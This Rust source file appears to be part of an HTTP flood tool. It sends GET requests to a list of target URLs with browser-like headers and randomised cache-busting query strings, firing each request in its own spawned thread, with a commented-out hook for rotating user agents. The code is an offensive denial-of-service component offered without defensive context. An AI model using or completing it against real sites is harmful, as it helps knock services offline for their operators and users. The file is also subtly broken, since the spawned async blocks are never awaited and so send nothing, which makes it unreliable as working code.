use crate::{target, utils::clear_page_cache};
use reqwest::{header, Method};

#[derive(Debug)]
pub enum AttackError {
    Request(reqwest::Error),
}

pub async fn start_one(targets: Vec<target::Target>) -> Result<(), AttackError> {
    let ref mut headers = header::HeaderMap::new();
    headers.insert(
        "Accept",
        header::HeaderValue::from_static(
            "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
        ),
    );
    for t in targets.into_iter() {
        let req_client = reqwest::ClientBuilder::new()
            //.user_agent(any_other_user_agent())
            .default_headers(headers.clone())
            .build()
            .map_err(AttackError::Request)?;

        match t.method {
            Method::GET => match t.url {
                Some(mut u) => {
                    u.set_query(Some(&clear_page_cache()));
                    std::thread::spawn(move || async move {
                        let _ = req_client.get(u.as_str()).send().await;
                    });
                    // crate::log(u);
                }
                None => {
                    continue;
                }
            },
            _ => {
                // unimplemented!();
            }
        }
    }

    Ok(())
}
